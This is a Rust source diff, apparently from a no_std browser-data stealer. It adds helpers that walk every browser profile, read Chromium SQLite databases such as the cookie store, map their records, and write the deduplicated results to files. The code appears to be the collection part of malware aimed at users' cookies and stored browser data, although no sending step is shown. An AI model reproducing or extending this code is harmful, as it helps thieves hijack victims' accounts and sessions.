@@ -1,16 +1,21 @@
 #![no_std]
 
 extern crate alloc;
+use alloc::boxed::Box;
+use sqlite::{DatabaseReader, TableRecord};
 mod chromium;
 
 use crate::alloc::borrow::ToOwned;
-use alloc::string::String;
+use alloc::string::{String, ToString};
 
 use crate::chromium::ChromiumTask;
 use alloc::vec;
+use alloc::vec::Vec;
 use core::fmt::{Display, Formatter};
+use sqlite::read_sqlite3_database_by_bytes;
 use tasks::Task;
 use tasks::{composite_task, impl_composite_task_runner, CompositeTask};
+use utils::path::{Path, WriteToFile};
 
 pub struct BrowsersTask {
     inner: CompositeTask
@@ -27,6 +32,54 @@ impl BrowsersTask {
 }
 
 impl_composite_task_runner!(BrowsersTask, "Browsers");
+
+pub(crate) fn collect_from_all_profiles<F, T>(profiles: &[Path], f: F) -> Option<Vec<T>>
+where
+    F: Fn(&Path) -> Option<Vec<T>>,
+    T: Ord
+{
+    let mut data: Vec<T> = profiles
+        .iter()
+        .filter_map(|profile| f(profile))
+        .flat_map(|v| v.into_iter())
+        .collect();
+    
+    if data.is_empty() {
+        None
+    } else {
+        data.sort();
+        data.dedup();
+
+        Some(data)
+    }
+}
+
+pub(crate) fn to_string_and_write_all<T>(data: &[T], sep: &str, dst: &Path) -> Result<(), u32>
+where
+    T: Display
+{
+    data
+        .iter()
+        .map(|it| it.to_string())
+        .collect::<Vec<String>>()
+        .join(sep)
+        .write_to(dst)
+}
+
+pub(crate) fn read_sqlite3_and_map_records<T, F>(path: &Path, table_name: &str, mapper: F) -> Option<Vec<T>>
+where
+    F: Fn(&Box<dyn TableRecord>) -> Option<T>,
+{
+    let bytes = path.read_file().ok()?;
+    let db = read_sqlite3_database_by_bytes(&bytes)?;
+    let table = db.read_table(table_name)?;
+    
+    let records = table
+        .filter_map(|record| mapper(&record))
+        .collect();
+    
+    Some(records)
+}
 
 #[derive(PartialEq, Ord, Eq, PartialOrd)]
 pub(crate) struct Cookie {
